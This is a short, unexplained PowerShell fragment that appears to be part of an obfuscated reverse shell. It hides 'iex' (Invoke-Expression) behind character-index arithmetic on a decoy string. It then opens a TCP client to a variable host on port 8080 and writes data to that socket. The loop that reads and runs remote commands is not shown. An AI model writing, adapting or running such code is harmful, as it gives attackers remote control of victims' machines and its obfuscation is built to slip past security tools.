...
$enco = [System.Text.ASCIIEncoding];[byte[]]$b = 0..65535|%{0}
$s = "gi-ekjf-xsld"
Set-alias $s ( $s[$true-12] + ($s[[byte]("0x" + "FF") - 264]) + ($s[[byte]("0x" + "9a") - 158]) )
$tp = New-Object System.Net.Sockets.TCPClient($ip,8080);$get = $tp.GetStream()
$d = $enco::UTF8.GetBytes($wget);$get.Write($d, 0, $d.Length)
